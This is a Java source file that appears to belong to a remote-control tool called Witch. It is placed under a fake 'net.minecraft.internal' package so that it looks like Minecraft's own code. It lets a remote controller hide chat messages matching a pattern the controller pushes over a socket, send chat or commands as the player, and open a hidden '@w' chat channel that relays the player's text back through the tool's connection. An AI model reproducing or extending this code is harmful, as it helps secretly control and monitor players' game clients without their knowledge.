package net.minecraft.internal.utils;

import net.minecraft.internal.Witch;
import me.soda.witch.shared.socket.messages.Variables;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.util.regex.Pattern;

import static net.minecraft.internal.Witch.mc;

public class ChatUtil {
    private static boolean firstTime = true;

    public static boolean filter(Text message) {
        if (!Variables.INSTANCE.isBeingFiltered) return false;
        Pattern pattern = Pattern.compile(Variables.INSTANCE.filterPattern);
        return pattern.matcher(message.getString()).find();
    }

    public static void sendChat(String message) {
        if (!MCUtils.canUpdate()) return;
        mc.inGameHud.getChatHud().addToMessageHistory(message);
        if (message.startsWith("/")) mc.getNetworkHandler().sendCommand(message.substring(1));
        else mc.getNetworkHandler().sendChatMessage(message);
    }

    public static void chat(Text msg, boolean you) {
        if (!MCUtils.canUpdate()) return;

        Text prefix = Text.of(Formatting.GRAY + "[" + Formatting.DARK_PURPLE + (you ? "You" : Variables.INSTANCE.name) + Formatting.GRAY + "] " + Formatting.RESET);

        if (firstTime) {
            firstTime = false;
            chat(Text.of("Notice: Type @w <text> to chat with me."), false);
        }

        MutableText message = Text.literal("");
        message.append(prefix);
        message.append(msg);

        mc.inGameHud.getChatHud().addMessage(message);
    }

    public static boolean tryChatBack(String string) {
        String[] msgArr = string.split(" ");
        if (firstTime || msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
        String[] strArr = new String[msgArr.length - 1];
        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
        String chatText = String.join(" ", strArr);
        chat(Text.of(chatText), true);
        Witch.send("chat", chatText);
        return true;
    }
}
